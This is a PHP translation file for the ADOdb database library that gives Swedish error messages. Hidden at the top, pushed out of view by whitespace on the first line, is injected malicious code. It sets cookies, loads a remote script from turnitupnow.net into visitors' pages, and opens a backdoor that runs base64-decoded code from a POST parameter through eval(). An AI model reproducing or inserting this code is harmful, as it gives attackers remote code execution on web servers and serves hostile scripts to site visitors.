<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// Christian Tiberg" christian@commsoft.nu
$ADODB_LANG_ARRAY = array (
			'LANG'                      => 'en',
            DB_ERROR                    => 'Okänt fel',
            DB_ERROR_ALREADY_EXISTS     => 'finns redan',
            DB_ERROR_CANNOT_CREATE      => 'kan inte skapa',
            DB_ERROR_CANNOT_DELETE      => 'kan inte ta bort',
            DB_ERROR_CANNOT_DROP        => 'kan inte släppa',
            DB_ERROR_CONSTRAINT         => 'begränsning kränkt',
            DB_ERROR_DIVZERO            => 'division med noll',
            DB_ERROR_INVALID            => 'ogiltig',
            DB_ERROR_INVALID_DATE       => 'ogiltigt datum eller tid',
            DB_ERROR_INVALID_NUMBER     => 'ogiltigt tal',
            DB_ERROR_MISMATCH           => 'felaktig matchning',
            DB_ERROR_NODBSELECTED       => 'ingen databas vald',
            DB_ERROR_NOSUCHFIELD        => 'inget sådant fält',
            DB_ERROR_NOSUCHTABLE        => 'ingen sådan tabell',
            DB_ERROR_NOT_CAPABLE        => 'DB backend klarar det inte',
            DB_ERROR_NOT_FOUND          => 'finns inte',
            DB_ERROR_NOT_LOCKED         => 'inte låst',
            DB_ERROR_SYNTAX             => 'syntaxfel',
            DB_ERROR_UNSUPPORTED        => 'stöds ej',
            DB_ERROR_VALUE_COUNT_ON_ROW => 'värde räknat på rad',
            DB_ERROR_INVALID_DSN        => 'ogiltig DSN',
            DB_ERROR_CONNECT_FAILED     => 'anslutning misslyckades',
            0	                       => 'inget fel', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'otillräckligt med data angivet',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'utökning hittades ej',
            DB_ERROR_NOSUCHDB           => 'ingen sådan databas',
            DB_ERROR_ACCESS_VIOLATION   => 'otillräckliga rättigheter'
);
?>